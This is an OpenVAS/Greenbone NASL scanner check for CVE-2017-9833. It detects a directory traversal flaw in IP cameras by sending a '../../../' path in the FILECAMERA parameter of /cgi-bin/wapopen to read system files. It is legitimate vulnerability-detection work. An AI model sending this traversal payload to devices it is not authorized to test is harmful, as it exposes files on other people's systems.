# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106907");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2017-06-26 14:23:36 +0700 (Mon, 26 Jun 2017)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2023-02-15 02:37:00 +0000 (Wed, 15 Feb 2023)");

  script_cve_id("CVE-2017-9833");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Multiple IP-Cameras Directory Traversal Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Boa/banner");

  script_tag(name:"summary", value:"The IP-Camera is prone to a directory traversal vulnerability.");

  script_tag(name:"insight", value:"The scripts '/cgi-bin/wappwd' and '/cgi-bin/wapopen' are prone to a
  directory traversal vulnerability because they fail to properly sanitize user-supplied input in the 'FILEFAIL'
  and 'FILECAMERA' parameters respectively.");

  script_tag(name:"impact", value:"An unauthenticated attacker can exploit this vulnerability to retrieve
  arbitrary files from the vulnerable system in the context of the affected application. Information obtained may
  aid in further attacks.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"https://pastebin.com/raw/rt7LJvyF");
  script_xref(name:"URL", value:"http://www.oamk.fi/~jukkao/bugtraq/1104/0206.html");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

port = http_get_port(default: 80);

files = traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];

  url = "/cgi-bin/wapopen?FILECAMERA=../../../" + file;

  if (http_vuln_check(port: port, url: url, pattern: pattern, check_header: TRUE)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
